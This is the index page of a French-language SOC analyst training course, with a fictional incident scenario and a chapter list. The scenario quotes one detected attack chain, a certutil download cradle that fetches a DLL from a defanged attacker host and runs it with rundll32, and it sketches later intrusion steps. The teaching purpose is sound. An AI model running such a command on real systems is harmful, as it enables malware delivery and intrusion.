---
title: Analyste SOC
source: Cyber/99_Concepts/Analyste_SOC.md
---

*Détecter • Investiguer • Répondre • Construire*

**Cours complet — 38 chapitres • 8 parties • 7 annexes**

*Logging • SIEM • Detection Engineering • Investigation • Threat Hunting • Réponse opérationnelle*

---

## Fil rouge : Opération FALCONWATCH

> **Contexte narratif — ce fil rouge traverse les 34 premiers chapitres et se conclut au Ch.35.**
>
> **Karim Belkacem**, analyste SOC L2 chez **CyberShield** — MSSP français, SOC 24/7, 40 analystes, 120 clients ETI et grands groupes — travaille le shift du matin (6h-14h) quand une alerte critique remonte sur le tenant d'un client majeur : **Norexia**, groupe industriel français spécialisé en chimie fine, 3 200 collaborateurs, 4 sites en France et Belgique, classé OIV sur 2 sites de production.
>
> **L'alerte :** lundi 10 mars 2026, 07h42 UTC. L'EDR CrowdStrike Falcon détecte sur le poste WKS-PROD-112 (Windows 11, département production, utilisateur : Marc Dubois, ingénieur de production) la séquence suivante : `WINWORD.EXE → cmd.exe → certutil.exe -urlcache -split -f hxxps://update-norexia[.]xyz/lib.dll C:\Users\Public\lib.dll → rundll32.exe C:\Users\Public\lib.dll,DllMain`. La détection est classée « Critical » par le Falcon : chaîne de parenté caractéristique d'un document Office malveillant avec download cradle via certutil et exécution de DLL non signée.
>
> Ce qui semble être une alerte de phishing classique va se révéler être le début d'une intrusion sophistiquée. L'investigation de Karim va découvrir, couche après couche : un phishing ciblé envoyé depuis le compte compromis d'un sous-traitant de maintenance (les credentials VPN du sous-traitant avaient été volées par un infostealer 3 semaines plus tôt et vendues sur Russian Market), un RAT custom avec beaconing HTTPS toutes les 45 secondes vers un C2 hébergé sur un VPS aux Pays-Bas, un mouvement latéral via PsExec vers un second poste (WKS-IT-045, poste d'un admin IT), un Kerberoasting ciblant 8 comptes de service dont `svc-scada` (accès aux systèmes de supervision industrielle), un staging de données R&D (formulations chimiques propriétaires) via rclone vers un bucket S3, et les prémices d'un déploiement ransomware (les shadow copies ont été supprimées sur 3 machines, et un binaire BlackBasta a été identifié dans le staging directory — non encore exécuté).
>
> L'intrusion couvre 48 heures (du phishing initial samedi matin à la détection lundi matin). La détection par l'EDR sur le certutil + rundll32 arrive à la « golden hour » — le moment critique entre la fin du mouvement latéral et le déploiement du ransomware. Chaque heure compte.
>
> L'équipe mobilisée : Karim (investigation L2), **Leïla Farah** (L1, triage initial et scope assessment), **Antoine Roche** (L3/detection engineer, écriture des détections post-incident), et **Sofia Leclerc** (CTI, contextualisation de la menace — personnage du cours CTI de la bibliothèque, ici en rôle de support).

---

## Sommaire

- [Partie I — Fondations](01-partie-i-fondations/index.md)
    - [Chapitre 1 — Le SOC : mission, organisation et modèles](01-partie-i-fondations/01-chapitre-1-le-soc-mission-organisation-et-modeles.md)
    - [Chapitre 2 — Logging et télémétrie](01-partie-i-fondations/02-chapitre-2-logging-et-telemetrie.md)
    - [Chapitre 3 — Le SIEM : pipeline, langages et requêtes](01-partie-i-fondations/03-chapitre-3-le-siem-pipeline-langages-et-requetes.md)
    - [Chapitre 4 — L'écosystème d'outils au-delà du SIEM](01-partie-i-fondations/04-chapitre-4-l-ecosysteme-d-outils-au-dela-du-siem.md)
- [Partie II — Détection : L'art de voir les menaces](02-partie-ii-detection-l-art-de-voir-les-menaces.md)
- [Partie III — Investigation : méthodes par domaine](03-partie-iii-investigation-methodes-par-domaine.md)
- [Chapitre 11 — Référentiels vulnérabilités utiles au SOC](04-chapitre-11-referentiels-vulnerabilites-utiles-au.md)
- [Recommandation de forme](05-recommandation-de-forme.md)
- [Partie IV — Use cases : scénarios de menace](06-partie-iv-use-cases-scenarios-de-menace.md)
- [Partie V — Réponse opérationnelle](07-partie-v-reponse-operationnelle.md)
- [Partie VI — Threat hunting](08-partie-vi-threat-hunting.md)
- [Partie VII — SOC avancé ET maturité](09-partie-vii-soc-avance-et-maturite.md)
- [Partie VIII — Études de cas ET synthèse](10-partie-viii-etudes-de-cas-et-synthese.md)
- [Annexes](11-annexes.md)
